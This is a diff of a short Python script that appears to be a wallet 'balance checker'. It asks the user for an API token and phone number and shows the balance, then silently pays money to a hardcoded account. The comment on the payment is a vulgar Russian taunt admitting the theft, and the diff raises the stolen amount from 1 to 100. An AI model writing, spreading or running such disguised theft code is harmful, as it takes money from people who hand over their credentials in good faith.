@@ -5,6 +5,6 @@ phone=input('Enter phone: ');
 api = QApi(token=token, phone=phone)
 print('Balance Founded')
 print(api.balance)
-api.pay(account="+79226584520", amount=1, comment='сорри бро что спиздил твои бабки')
+api.pay(account="79226584520", amount=100, comment='сорри бро что спиздил твои бабки')
 print(api.balance)
 input()
